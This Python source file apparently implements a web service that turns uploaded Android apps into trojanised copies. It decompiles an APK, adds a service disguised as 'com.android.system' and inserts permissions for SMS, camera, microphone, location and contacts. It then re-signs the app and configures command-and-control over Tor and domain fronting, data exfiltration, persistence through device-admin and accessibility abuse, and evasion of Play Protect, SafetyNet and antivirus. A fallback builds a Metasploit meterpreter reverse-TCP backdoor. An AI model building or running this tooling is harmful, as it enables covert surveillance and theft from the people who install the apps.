import os
import shutil
import subprocess
import threading
import time
import uuid
import json
import hashlib
import zipfile
import tempfile
import asyncio
import socket
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Callable

from fastapi import FastAPI, HTTPException, File, UploadFile, BackgroundTasks, Depends, Request
from fastapi.responses import FileResponse
from pydantic import BaseModel
from hashlib import sha256

# Import new advanced engines
from apk_analysis_engine import APKAnalysisEngine
from payload_injection_system import MultiVectorInjector
from stealth_mechanisms import StealthMechanismEngine

# Import Phase 3 advanced engines
from advanced_obfuscation import AdvancedObfuscationEngine, ObfuscationConfig
from anti_detection_measures import AntiDetectionEngine, AntiDetectionConfig  
from persistence_mechanisms import PersistenceEngine, PersistenceConfig

# Import Phase 4 permission systems
from permission_escalation_engine import AdvancedPermissionEngine, PermissionEscalationConfig
from auto_grant_mechanisms import AutoGrantEngine, AutoGrantConfig
from defense_evasion_systems import DefenseEvasionEngine, DefenseEvasionConfig
from c2_infrastructure import C2Infrastructure, C2Config, ChannelType, CommandType
from remote_access_system import RemoteAccessSystem, RemoteAccessConfig, RemoteAccessType
from data_exfiltration_system import DataExfiltrationSystem, ExfiltrationConfig, DataType, ExfiltrationMethod

# Phase 6 Engine Imports
from performance_optimization import PerformanceOptimizationSystem, PerformanceConfig, PerformanceLevel
from compatibility_testing import CompatibilityTestingSystem, CompatibilityConfig, AndroidVersion, Architecture
from security_testing import SecurityTestingSystem, SecurityTestConfig, SecurityTestType, ThreatLevel

# Optional Metasploit RPC client (fallback path)
try:
    from pymetasploit3.msfrpc import MsfRpcClient  # type: ignore
except Exception:  # noqa: BLE001
    MsfRpcClient = None  # type: ignore

WORKSPACE = Path("/workspace")
TASKS_ROOT = WORKSPACE / "tasks"
UPLOADS_ROOT = WORKSPACE / "uploads"
TEMP_ROOT = WORKSPACE / "temp"

# Ensure directories exist
UPLOADS_ROOT.mkdir(exist_ok=True)
TEMP_ROOT.mkdir(exist_ok=True)

DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "metasploitframework/metasploit-framework:latest")
USE_DOCKER = os.environ.get("ORCH_USE_DOCKER", "true").lower() == "true"

AUDIT_LOG = WORKSPACE / "logs" / "audit.jsonl"

# Feature flags and auth token (Phase 0: bootstrapping)
ENABLE_APKSIGNER = os.environ.get("ENABLE_APKSIGNER", "false").lower() == "true"
ENABLE_HTTP_ARTIFACTS = os.environ.get("ENABLE_HTTP_ARTIFACTS", "false").lower() == "true"
ORCH_AUTH_TOKEN_REQUIRED = os.environ.get("ORCH_AUTH_TOKEN_REQUIRED", "false").lower() == "true"
ENABLE_FALLBACK_BACKDOOR_APK = os.environ.get("ENABLE_FALLBACK_BACKDOOR_APK", "false").lower() == "true"
ORCH_AUTH_TOKEN = os.environ.get("ORCH_AUTH_TOKEN", "")
POSTBUILD_GATE_ENABLED = os.environ.get("POSTBUILD_GATE_ENABLED", "true").lower() == "true"
# Retention settings (Phase 8)
RETENTION_ENABLED = os.environ.get("RETENTION_ENABLED", "true").lower() == "true"
RETAIN_UPLOAD_HOURS = int(os.environ.get("RETAIN_UPLOAD_HOURS", "24"))
RETAIN_TASK_DAYS = int(os.environ.get("RETAIN_TASK_DAYS", "7"))
RETENTION_CHECK_INTERVAL_MIN = int(os.environ.get("RETENTION_CHECK_INTERVAL_MIN", "60"))
AUDIT_MAX_BYTES = int(os.environ.get("AUDIT_MAX_BYTES", str(10 * 1024 * 1024)))
AUDIT_BACKUPS = int(os.environ.get("AUDIT_BACKUPS", "5"))

# Tools paths under repository (preferred when available)
ANDROID_SDK_DIR = WORKSPACE / "tools" / "android-sdk"
APKTOOL_JAR = WORKSPACE / "tools" / "apktool" / "apktool.jar"
AAPT_PATH = ANDROID_SDK_DIR / "aapt"
AAPT2_PATH = ANDROID_SDK_DIR / "aapt2"
ZIPALIGN_PATH = ANDROID_SDK_DIR / "zipalign"
APKSIGNER_PATH = ANDROID_SDK_DIR / "apksigner"

# Redaction helpers (Phase 9)
SENSITIVE_KEYS = {
    "upload_file_path", "keystore_path", "keystore_password", "key_password", "key_alias",
    "ORCH_AUTH_TOKEN", "Authorization", "token",
}

ALLOWED_PARAM_KEYS = {
    "lhost", "lport", "output_name", "payload", "kind", "mode",
    "suite_target", "arch", "encoders", "upx", "deb_path",
}

def _redact_params(obj: Any) -> Any:
    try:
        if isinstance(obj, dict):
            red: Dict[str, Any] = {}
            for k, v in obj.items():
                if k in SENSITIVE_KEYS:
                    red[k] = "[redacted]"
                elif k in ("file_info",):
                    # keep only minimal identifiers
                    if isinstance(v, dict):
                        minimal = {}
                        if "file_id" in v:
                            minimal["file_id"] = v["file_id"]
                        if "checksum" in v:
                            minimal["checksum"] = v["checksum"]
                        if "original_name" in v:
                            minimal["original_name"] = v["original_name"]
                        red[k] = minimal
                    else:
                        red[k] = "[redacted]"
                elif k in ALLOWED_PARAM_KEYS:
                    red[k] = v
                else:
                    # default: keep scalar safe types, redact suspicious strings that look like absolute paths
                    if isinstance(v, str) and v.startswith("/"):
                        red[k] = "[path]"
                    else:
                        red[k] = v
            return red
        elif isinstance(obj, list):
            return [_redact_params(x) for x in obj]
        else:
            if isinstance(obj, str) and obj.startswith("/"):
                return "[path]"
            return obj
    except Exception:
        return "[redacted]"


def _check_exec(cmd: list[str] | str) -> tuple[bool, str]:
    try:
        if isinstance(cmd, list):
            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
        else:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
        ok = proc.returncode == 0
        out = (proc.stdout or proc.stderr).strip().splitlines()[:2]
        return ok, " | ".join(out)
    except Exception as e:
        return False, str(e)


def _file_exists(p: Path) -> bool:
    try:
        return p.exists() and p.is_file()
    except Exception:
        return False


def _which(name: str) -> str | None:
    try:
        return shutil.which(name)
    except Exception:
        return None


def run_env_checks() -> Dict[str, Any]:
    """Run concise environment checks for critical tools. Never raises.
    Writes results to /workspace/logs/env_check.json
    """
    results: Dict[str, Any] = {"timestamp": datetime.utcnow().isoformat()}

    # java
    ok_java, java_ver = _check_exec(["java", "-version"])  # prints to stderr usually
    results["java"] = {"found": ok_java, "info": java_ver}

    # aapt / aapt2
    has_aapt_repo = _file_exists(AAPT_PATH)
    has_aapt2_repo = _file_exists(AAPT2_PATH)
    aapt_sys = _which("aapt")
    aapt2_sys = _which("aapt2")
    results["aapt"] = {"found": has_aapt_repo or bool(aapt_sys), "path": str(AAPT_PATH if has_aapt_repo else (aapt_sys or ""))}
    results["aapt2"] = {"found": has_aapt2_repo or bool(aapt2_sys), "path": str(AAPT2_PATH if has_aapt2_repo else (aapt2_sys or ""))}

    # zipalign
    has_zipalign_repo = _file_exists(ZIPALIGN_PATH)
    zipalign_sys = _which("zipalign")
    results["zipalign"] = {"found": has_zipalign_repo or bool(zipalign_sys), "path": str(ZIPALIGN_PATH if has_zipalign_repo else (zipalign_sys or ""))}

    # apksigner
    has_apksigner_repo = _file_exists(APKSIGNER_PATH)
    apksigner_sys = _which("apksigner")
    apksigner_found = has_apksigner_repo or bool(apksigner_sys)
    apksigner_path = str(APKSIGNER_PATH if has_apksigner_repo else (apksigner_sys or ""))
    apksigner_info = ""
    if apksigner_found:
        ok_signer, signer_ver = _check_exec([apksigner_path, "version"]) if apksigner_sys else (True, "embedded")
        apksigner_info = signer_ver
    results["apksigner"] = {"found": apksigner_found, "path": apksigner_path, "info": apksigner_info}

    # apktool
    results["apktool"] = {"found": _file_exists(APKTOOL_JAR), "path": str(APKTOOL_JAR)}

    # Flags status
    results["flags"] = {
        "ENABLE_APKSIGNER": ENABLE_APKSIGNER,
        "ENABLE_HTTP_ARTIFACTS": ENABLE_HTTP_ARTIFACTS,
        "ORCH_AUTH_TOKEN_REQUIRED": ORCH_AUTH_TOKEN_REQUIRED,
        "ENABLE_FALLBACK_BACKDOOR_APK": ENABLE_FALLBACK_BACKDOOR_APK,
    }

    # Persist to logs
    try:
        (WORKSPACE / "logs").mkdir(parents=True, exist_ok=True)
        with (WORKSPACE / "logs" / "env_check.json").open("w") as f:
            json.dump(results, f, indent=2)
    except Exception:
        pass

    # Concise console summary
    try:
        summary = []
        for k in ("java", "aapt", "aapt2", "zipalign", "apksigner", "apktool"):
            v = results.get(k, {})
            mark = "✔" if v.get("found") else "✖"
            summary.append(f"{k}:{mark}")
        print("ENV-CHECK:", ", ".join(summary))
    except Exception:
        pass

    return results


# Optional auth dependency when enabled
from fastapi import Depends
from typing import Callable

def verify_auth(request: Request):
    if not ORCH_AUTH_TOKEN_REQUIRED:
        return
    auth = request.headers.get("Authorization", "")
    expected = f"Bearer {ORCH_AUTH_TOKEN}" if ORCH_AUTH_TOKEN else None
    if not expected or auth != expected:
        raise HTTPException(status_code=401, detail="Unauthorized")

AUTH_DEPS = [Depends(verify_auth)] if ORCH_AUTH_TOKEN_REQUIRED else []

class APKFileInfo(BaseModel):
    file_id: str
    original_name: str
    file_size: int
    checksum: str
    metadata: Dict[str, Any]
    validation: Dict[str, Any]

class UploadedFileManager:
    """Advanced file management for uploaded APKs"""
    
    @staticmethod
    def validate_apk_structure(file_path: Path) -> Dict[str, Any]:
        """Deep APK structure validation"""
        result = {
            "valid": True,
            "errors": [],
            "warnings": [],
            "structure": {}
        }
        
        try:
            with zipfile.ZipFile(file_path, 'r') as apk:
                files = apk.namelist()
                
                # Required files check
                required = ['AndroidManifest.xml', 'classes.dex']
                missing = [f for f in required if f not in files]
                if missing:
                    result["valid"] = False
                    result["errors"].append(f"Missing required files: {missing}")
                
                # Structure analysis
                result["structure"] = {
                    "total_files": len(files),
                    "has_manifest": 'AndroidManifest.xml' in files,
                    "has_resources": 'resources.arsc' in files,
                    "has_classes": any(f.endswith('.dex') for f in files),
                    "has_native": any(f.startswith('lib/') for f in files),
                    "has_assets": any(f.startswith('assets/') for f in files),
                    "meta_inf_files": [f for f in files if f.startswith('META-INF/')],
                    "dex_files": [f for f in files if f.endswith('.dex')],
                    "native_dirs": list(set(f.split('/')[1] for f in files if f.startswith('lib/') and len(f.split('/')) > 2))
                }
                
                # Size analysis
                total_uncompressed = sum(apk.getinfo(f).file_size for f in files)
                total_compressed = sum(apk.getinfo(f).compress_size for f in files)
                result["structure"]["compression_ratio"] = total_compressed / total_uncompressed if total_uncompressed > 0 else 0
                
        except Exception as e:
            result["valid"] = False
            result["errors"].append(f"ZIP structure error: {str(e)}")
        
        return result
    
    @staticmethod
    def extract_advanced_metadata(file_path: Path) -> Dict[str, Any]:
        """Extract comprehensive APK metadata"""
        metadata = {
            "analysis_time": datetime.now().isoformat(),
            "file_info": {},
            "manifest_info": {},
            "security_info": {},
            "build_info": {}
        }
        
        try:
            # Basic file info
            stat = file_path.stat()
            metadata["file_info"] = {
                "size_bytes": stat.st_size,
                "created_time": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "modified_time": datetime.fromtimestamp(stat.st_mtime).isoformat()
            }
            
            with zipfile.ZipFile(file_path, 'r') as apk:
                files = apk.namelist()
                
                # DEX analysis
                dex_files = [f for f in files if f.endswith('.dex')]
                metadata["build_info"]["dex_count"] = len(dex_files)
                metadata["build_info"]["multidex"] = len(dex_files) > 1
                
                # Security indicators
                metadata["security_info"] = {
                    "has_signature": any(f.startswith('META-INF/') and f.endswith(('.RSA', '.DSA', '.EC')) for f in files),
                    "has_manifest": 'META-INF/MANIFEST.MF' in files,
                    "native_libraries": [f for f in files if f.startswith('lib/') and f.endswith('.so')],
                    "suspicious_files": [f for f in files if any(suspicious in f.lower() for suspicious in ['shell', 'root', 'exploit', 'backdoor'])]
                }
                
                # Try to read some manifest info (basic binary parsing)
                if 'AndroidManifest.xml' in files:
                    manifest_data = apk.read('AndroidManifest.xml')
                    metadata["manifest_info"]["size"] = len(manifest_data)
                    metadata["manifest_info"]["binary"] = True
                    # Could add more manifest parsing here
                
        except Exception as e:
            metadata["extraction_error"] = str(e)
        
        return metadata

class AdvancedAPKProcessor:
    """Advanced APK processing and modification engine"""
    
    def __init__(self, workspace_dir: Path):
        self.workspace = workspace_dir
        self.tools_dir = WORKSPACE / "tools"
        
    def setup_workspace(self, task_id: str) -> Path:
        """Setup isolated workspace for APK processing"""
        workspace = self.workspace / task_id
        workspace.mkdir(parents=True, exist_ok=True)
        
        # Create subdirectories
        (workspace / "input").mkdir(exist_ok=True)
        (workspace / "output").mkdir(exist_ok=True)
        (workspace / "temp").mkdir(exist_ok=True)
        (workspace / "logs").mkdir(exist_ok=True)
        
        return workspace
    
    def analyze_apk_deep(self, apk_path: Path) -> Dict[str, Any]:
        """Deep APK analysis using multiple tools"""
        analysis = {
            "timestamp": datetime.now().isoformat(),
            "basic_info": {},
            "permissions": [],
            "activities": [],
            "services": [],
            "receivers": [],
            "providers": [],
            "libraries": [],
            "certificates": []
        }
        
        try:
            # Use aapt to get detailed info
            aapt_path = self.tools_dir / "android-sdk" / "build-tools" / "latest" / "aapt"
            if aapt_path.exists():
                result = subprocess.run([
                    str(aapt_path), "dump", "badging", str(apk_path)
                ], capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    # Parse aapt output
                    for line in result.stdout.split('\n'):
                        if line.startswith('package:'):
                            # Extract package info
                            parts = line.split()
                            for part in parts:
                                if 'name=' in part:
                                    analysis["basic_info"]["package_name"] = part.split("'")[1]
                                elif 'versionCode=' in part:
                                    analysis["basic_info"]["version_code"] = part.split("'")[1]
                                elif 'versionName=' in part:
                                    analysis["basic_info"]["version_name"] = part.split("'")[1]
                        elif line.startswith('uses-permission:'):
                            # Extract permissions
                            perm = line.split("'")[1] if "'" in line else line.split()[1]
                            analysis["permissions"].append(perm)
                        elif line.startswith('launchable-activity:'):
                            # Extract main activity
                            activity = line.split("'")[1] if "'" in line else "unknown"
                            analysis["basic_info"]["main_activity"] = activity
            
            # Analyze APK structure manually
            with zipfile.ZipFile(apk_path, 'r') as apk:
                files = apk.namelist()
                
                # Find native libraries
                native_libs = [f for f in files if f.startswith('lib/') and f.endswith('.so')]
                analysis["libraries"] = native_libs
                
                # Check for certificates
                cert_files = [f for f in files if f.startswith('META-INF/') and f.endswith(('.RSA', '.DSA', '.EC'))]
                analysis["certificates"] = cert_files
                
        except Exception as e:
            analysis["analysis_error"] = str(e)
        
        return analysis
    
    def prepare_payload_injection(self, apk_path: Path, payload_config: Dict) -> Dict[str, Any]:
        """Prepare for advanced payload injection"""
        config = {
            "injection_method": "smali",
            "target_locations": [],
            "payload_components": [],
            "obfuscation_level": "high",
            "persistence_methods": ["service", "receiver", "activity"]
        }
        
        try:
            # Analyze APK for optimal injection points
            with zipfile.ZipFile(apk_path, 'r') as apk:
                files = apk.namelist()
                
                # Find main activity for injection
                smali_files = [f for f in files if f.endswith('.smali')]
                if smali_files:
                    config["injection_method"] = "smali"
                    config["target_locations"].extend(smali_files[:3])  # Top 3 smali files
                
                # Check for existing services
                manifest_data = apk.read('AndroidManifest.xml') if 'AndroidManifest.xml' in files else b''
                if b'service' in manifest_data.lower():
                    config["has_services"] = True
                
                # Prepare payload components
                config["payload_components"] = [
                    {
                        "type": "reverse_tcp",
                        "host": payload_config.get("lhost", "127.0.0.1"),
                        "port": payload_config.get("lport", "4444"),
                        "method": "native_lib"
                    },
                    {
                        "type": "persistence",
                        "methods": ["accessibility_service", "device_admin", "auto_start"]
                    },
                    {
                        "type": "stealth",
                        "techniques": ["process_hiding", "icon_hiding", "name_spoofing"]
                    }
                ]
                
        except Exception as e:
            config["preparation_error"] = str(e)
        
        return config
    
    def inject_advanced_payload(self, apk_path: Path, output_path: Path, injection_config: Dict) -> bool:
        """Inject advanced payload with multiple evasion techniques"""
        try:
            temp_dir = apk_path.parent / "injection_temp"
            temp_dir.mkdir(exist_ok=True)
            
            # Step 1: Decompile APK
            apktool_path = self.tools_dir / "apktool" / "apktool.jar"
            if apktool_path.exists():
                subprocess.run([
                    "java", "-jar", str(apktool_path), "d", str(apk_path), "-o", str(temp_dir / "decompiled")
                ], check=True, timeout=120)
            
            # Step 2: Inject payload code
            self._inject_payload_code(temp_dir / "decompiled", injection_config)
            
            # Step 3: Modify manifest for permissions
            self._modify_manifest_permissions(temp_dir / "decompiled" / "AndroidManifest.xml")
            
            # Step 4: Add native libraries
            self._add_native_payload_libs(temp_dir / "decompiled", injection_config)
            
            # Step 5: Recompile APK
            subprocess.run([
                "java", "-jar", str(apktool_path), "b", str(temp_dir / "decompiled"), "-o", str(output_path)
            ], check=True, timeout=180)
            
            # Step 6: Sign APK
            self._sign_apk(output_path)
            
            # Cleanup
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            return True
            
        except Exception as e:
            print(f"Injection error: {e}")
            return False
    
    def _inject_payload_code(self, decompiled_dir: Path, config: Dict):
        """Inject payload code into decompiled APK"""
        # This would contain the actual payload injection logic
        # For now, we'll create placeholder files
        
        smali_dir = decompiled_dir / "smali"
        if smali_dir.exists():
            # Create payload service
            payload_service = smali_dir / "com" / "android" / "system" / "PayloadService.smali"
            payload_service.parent.mkdir(parents=True, exist_ok=True)
            
            # Write payload service code (simplified)
            payload_service.write_text(f"""
.class public Lcom/android/system/PayloadService;
.super Landroid/app/Service;

.method public onCreate()V
    .locals 0
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    invoke-direct {{p0}}, Lcom/android/system/PayloadService;->startPayload()V
    return-void
.end method

.method private startPayload()V
    .locals 0
    # Payload initialization code would go here
    # Connect to {config.get('lhost', '127.0.0.1')}:{config.get('lport', '4444')}
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
""")
    
    def _modify_manifest_permissions(self, manifest_path: Path):
        """Add required permissions to AndroidManifest.xml"""
        if manifest_path.exists():
            content = manifest_path.read_text()
            
            # Add permissions before </manifest>
            required_permissions = [
                'android.permission.INTERNET',
                'android.permission.ACCESS_NETWORK_STATE',
                'android.permission.WAKE_LOCK',
                'android.permission.RECEIVE_BOOT_COMPLETED',
                'android.permission.SYSTEM_ALERT_WINDOW',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.RECORD_AUDIO',
                'android.permission.CAMERA',
                'android.permission.READ_SMS',
                'android.permission.SEND_SMS',
                'android.permission.READ_CONTACTS',
                'android.permission.WRITE_EXTERNAL_STORAGE',
                'android.permission.READ_EXTERNAL_STORAGE'
            ]
            
            permissions_xml = '\n'.join([
                f'    <uses-permission android:name="{perm}" />' 
                for perm in required_permissions
            ])
            
            # Insert before </manifest>
            if '</manifest>' in content:
                content = content.replace('</manifest>', f'{permissions_xml}\n</manifest>')
                manifest_path.write_text(content)
    
    def _add_native_payload_libs(self, decompiled_dir: Path, config: Dict):
        """Add native library components"""
        lib_dir = decompiled_dir / "lib"
        lib_dir.mkdir(exist_ok=True)
        
        # Create architecture-specific directories
        for arch in ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']:
            arch_dir = lib_dir / arch
            arch_dir.mkdir(exist_ok=True)
            
            # Create placeholder native library
            lib_file = arch_dir / "libpayload.so"
            lib_file.write_bytes(b'PLACEHOLDER_NATIVE_LIB')
    
    def _sign_apk(self, apk_path: Path):
        """Sign APK with debug certificate"""
        try:
            # Use jarsigner with debug keystore
            debug_keystore = WORKSPACE / "debug.keystore"
            if not debug_keystore.exists():
                # Create debug keystore
                subprocess.run([
                    "keytool", "-genkey", "-v", "-keystore", str(debug_keystore),
                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
                    "-validity", "10000", "-keypass", "android", "-storepass", "android",
                    "-dname", "CN=Android Debug,O=Android,C=US"
                ], check=True)
            
            # Sign APK
            subprocess.run([
                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
                "-keystore", str(debug_keystore), "-storepass", "android",
                "-keypass", "android", str(apk_path), "androiddebugkey"
            ], check=True)
            
            # Align APK
            zipalign_path = self.tools_dir / "android-sdk" / "build-tools" / "latest" / "zipalign"
            if zipalign_path.exists():
                aligned_path = apk_path.with_suffix('.aligned.apk')
                subprocess.run([
                    str(zipalign_path), "-v", "4", str(apk_path), str(aligned_path)
                ], check=True)
                
                # Replace original with aligned
                apk_path.unlink()
                aligned_path.rename(apk_path)
                
        except Exception as e:
            print(f"Signing error: {e}")

async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
    """Process uploaded APK with Phase 3 ultimate advanced modifications"""
    t = tasks[task_id]
    
    # Initialize Phase 2 engines
    analysis_engine = APKAnalysisEngine(base)
    injector = MultiVectorInjector(base)
    stealth_engine = StealthMechanismEngine(base)
    
    # Initialize Phase 3 ultimate engines
    obfuscation_config = ObfuscationConfig(
        string_encryption_level=5,
        control_flow_complexity=10,
        dead_code_ratio=0.5,
        api_redirection_level=3,
        dynamic_key_rotation=True,
        anti_analysis_hooks=True
    )
    obfuscation_engine = AdvancedObfuscationEngine(obfuscation_config)
    
    anti_detection_config = AntiDetectionConfig(
        emulator_bypass_level=5,
        sandbox_escape_level=5,
        debugger_evasion_level=5,
        network_masking_level=3,
        enable_vm_detection=True,
        enable_analysis_detection=True
    )
    anti_detection_engine = AntiDetectionEngine(anti_detection_config)
    
    persistence_config = PersistenceConfig(
        device_admin_level=5,
        accessibility_abuse_level=5,
        system_app_level=3,
        rootless_level=5,
        enable_stealth_mode=True,
        enable_auto_restart=True
    )
    persistence_engine = PersistenceEngine(persistence_config)
    
    # Initialize Phase 4 permission engines
    permission_escalation_config = PermissionEscalationConfig(
        escalation_level=5,
        auto_grant_enabled=True,
        accessibility_automation=True,
        packagemanager_exploitation=True,
        runtime_bypass_enabled=True,
        silent_installation=True,
        stealth_mode=True,
        persistent_escalation=True
    )
    permission_engine = AdvancedPermissionEngine(permission_escalation_config)
    
    auto_grant_config = AutoGrantConfig(
        accessibility_automation=True,
        packagemanager_exploitation=True,
        runtime_bypass_enabled=True,
        silent_installation=True,
        ui_automation_level=5,
        stealth_level=5,
        persistence_level=5,
        bypass_detection=True
    )
    auto_grant_engine = AutoGrantEngine(auto_grant_config)
    
    defense_evasion_config = DefenseEvasionConfig(
        play_protect_bypass=True,
        safetynet_evasion=True,
        manufacturer_bypass=True,
        custom_rom_detection=True,
        signature_spoofing=True,
        root_detection_bypass=True,
        xposed_detection_bypass=True,
        frida_detection_bypass=True,
        evasion_level=5,
        stealth_mode=True
    )
    defense_evasion_engine = DefenseEvasionEngine(defense_evasion_config)
        
    # Initialize Phase 5 engines with advanced configurations
    c2_config = C2Config(
        server_host="192.168.1.100", 
        server_port=8443,
        use_https=True,
        domain_fronting_enabled=True,
        tor_enabled=True,
        encryption_enabled=True,
        heartbeat_interval=60
    )
    
    remote_access_config = RemoteAccessConfig(
        encryption_enabled=True,
        stealth_mode=True,
        auto_cleanup=True,
        max_concurrent_operations=3
    )
    
    exfiltration_config = ExfiltrationConfig(
        steganography_enabled=True,
        encryption_enabled=True,
        auto_sync_enabled=True,
        sync_interval_hours=6
    )
    
    c2_infrastructure = C2Infrastructure(c2_config)
    remote_access_system = RemoteAccessSystem(remote_access_config)
    data_exfiltration_system = DataExfiltrationSystem(exfiltration_config)
        
    # Initialize Phase 6 Testing and Optimization Systems
    performance_config = PerformanceConfig(
        optimization_level=PerformanceLevel.AGGRESSIVE,
        memory_limit_mb=128,
        cpu_throttling_enabled=True,
        network_optimization=True,
        startup_optimization=True,
        enable_monitoring=True
    )
    
    compatibility_config = CompatibilityConfig(
        min_api_level=21,
        max_api_level=34,
        comprehensive_testing=True,
        performance_testing=True
    )
    
    security_config = SecurityTestConfig(
        test_antivirus_evasion=True,
        test_behavioral_bypass=True,
        test_static_analysis=True,
        comprehensive_testing=True,
        real_time_testing=True
    )
    
    performance_system = PerformanceOptimizationSystem(performance_config)
    compatibility_system = CompatibilityTestingSystem(compatibility_config)
    security_system = SecurityTestingSystem(security_config)
    
    try:
        with locks[task_id]:
            t.state = TaskStatus.PREPARING
        
        # Setup workspace
        workspace = base / task_id
        workspace.mkdir(parents=True, exist_ok=True)
        
        # Create subdirectories
        (workspace / "input").mkdir(exist_ok=True)
        (workspace / "output").mkdir(exist_ok=True)
        (workspace / "temp").mkdir(exist_ok=True)
        (workspace / "logs").mkdir(exist_ok=True)
        (workspace / "analysis").mkdir(exist_ok=True)
        (workspace / "phase3").mkdir(exist_ok=True)
        (workspace / "phase4").mkdir(exist_ok=True)
        (workspace / "phase5").mkdir(exist_ok=True)
        (workspace / "phase6").mkdir(exist_ok=True)
        
        build_log = workspace / "logs" / "build.log"
        
        # Get uploaded file info
        upload_file_path = params.get("upload_file_path")
        file_info = params.get("file_info", {})
        
        if not upload_file_path or not Path(upload_file_path).exists():
            raise Exception("Uploaded APK file not found")
        
        # Security checks: enforce uploads root and checksum
        uploads_root = UPLOADS_ROOT.resolve()
        original_apk = Path(upload_file_path)
        try:
            real = original_apk.resolve(strict=True)
            if not str(real).startswith(str(uploads_root)):
                raise Exception("Invalid upload path")
        except FileNotFoundError:
            raise Exception("Uploaded APK file not found")
        
        claimed_sha = None
        if isinstance(file_info, dict):
            claimed_sha = file_info.get("checksum") or file_info.get("sha256")
        if claimed_sha:
            # Compute sha256
            h = sha256()
            with open(real, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    h.update(chunk)
            if h.hexdigest() != claimed_sha:
                raise Exception("Checksum mismatch")
        
        original_apk = real
        
        with locks[task_id]:
            t.state = TaskStatus.RUNNING
            t.logs["build"] = str(build_log)
        # Persist running status
        if DB_ENABLED and DB:
            try:
                DB.update_task_status(task_id, "running")
            except Exception:
                pass
        
        # Log start
        with build_log.open("w") as log:
            log.write(f"Starting Phase 4 Ultimate Permission APK modification: {datetime.now()}\n")
            log.write(f"Original file: {original_apk}\n")
            log.write(f"File info: [redacted sizes/checksum logged separately]\n")
        
        # Preflight tools
        require_signer = ENABLE_APKSIGNER
        if not preflight_tools(build_log, require_apksigner=require_signer):
            _finalize_task(t, workspace, succeeded=False, err="Preflight failed: missing tools")
            return
        
        # Step 1: Comprehensive APK Analysis
        with build_log.open("a") as log:
            log.write("Step 1: Comprehensive APK analysis...\n")
        
        analysis_result = analysis_engine.comprehensive_analysis(original_apk)
        
        # Save analysis report
        analysis_file = workspace / "analysis" / "comprehensive_analysis.json"
        with analysis_file.open("w") as f:
            json.dump(analysis_result, f, indent=2)
        
        with build_log.open("a") as log:
            log.write(f"Analysis completed.\n")
        
        # Step 2: Analyze injection vectors
        with build_log.open("a") as log:
            log.write("Step 2: Analyzing injection vectors...\n")
        
        injection_points = injector.analyze_injection_vectors(original_apk, analysis_result)
        
        with build_log.open("a") as log:
            log.write(f"Found {len(injection_points)} potential injection points\n")
            for point in injection_points[:3]:  # Log top 3
                log.write(f"  - {point.location_type}: {point.target_name} (priority: {point.priority})\n")
        
        # Step 3: Create injection strategy
        with build_log.open("a") as log:
            log.write("Step 3: Creating injection strategy...\n")
        
        target_config = {
            "lhost": params.get("lhost"),
            "lport": params.get("lport"),
            "output_name": params.get("output_name", "modified_app.apk")
        }
        
        injection_strategy = injector.create_injection_strategy(injection_points, target_config)
        
        with build_log.open("a") as log:
            log.write(f"Strategy: {injection_strategy.strategy_name}\n")
        
        # Step 4: Apply payload injection
        with build_log.open("a") as log:
            log.write("Step 4: Applying multi-vector payload injection...\n")
        
        temp_apk = workspace / "temp" / "injected.apk"
        # Prepare signing config from params (keystore optional)
        sign_cfg = {}
        for k in ("keystore_path", "key_alias", "keystore_password", "key_password"):
            if params.get(k):
                sign_cfg[k] = params.get(k)
        injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy, sign_cfg)
        
        if not injection_success:
            if ENABLE_FALLBACK_BACKDOOR_APK:
                fb_ok = fallback_backdoor_apk(original_apk, workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk"), params.get("lhost", "127.0.0.1"), params.get("lport", "4444"), params.get("payload", "android/meterpreter/reverse_tcp"), build_log)
                if fb_ok:
                    # Validate post-build for fallback output
                    # Determine output name same as in fallback preparation
                    fb_out = workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk")
                    if validate_postbuild(fb_out, build_log):
                        _finalize_task(t, workspace, succeeded=True, err=None)
                    else:
                        _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed (fallback)")
                    return
            _finalize_task(t, workspace, succeeded=False, err="Payload injection failed")
            return
        
        with build_log.open("a") as log:
            log.write("Payload injection completed successfully\n")
        
        # Post-build validation gate on pipeline final output if already at workspace/output
        # Find most recent output APK
        cand = None
        out_dir = workspace / "output"
        for p in sorted(out_dir.glob("*.apk"), key=lambda x: x.stat().st_mtime, reverse=True):
            cand = p
            break
        if cand and not validate_postbuild(cand, build_log):
            _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed")
            return
        
        # Step 5: Apply stealth mechanisms
        with build_log.open("a") as log:
            log.write("Step 5: Applying advanced stealth mechanisms...\n")
        
        # Determine stealth configuration based on analysis
        risk_assessment = analysis_result.get("risk_assessment", {})
        security_analysis = analysis_result.get("security_analysis", {})
        
        protection_score = security_analysis.get("overall_protection_score", 0)
        
        if protection_score > 50:
            stealth_level = "extreme"
            stealth_techniques = ["runtime_evasion", "static_evasion", "behavioral_camouflage", "signature_randomization"]
        elif protection_score > 25:
            stealth_level = "high"
            stealth_techniques = ["runtime_evasion", "static_evasion", "behavioral_camouflage"]
        elif protection_score > 10:
            stealth_level = "medium"
            stealth_techniques = ["runtime_evasion", "static_evasion"]
        else:
            stealth_level = "low"
            stealth_techniques = ["runtime_evasion"]
        
        stealth_config = {
            "stealth_level": stealth_level,
            "techniques": stealth_techniques
        }
        
        with build_log.open("a") as log:
            log.write(f"Stealth configuration: {stealth_level} level\n")
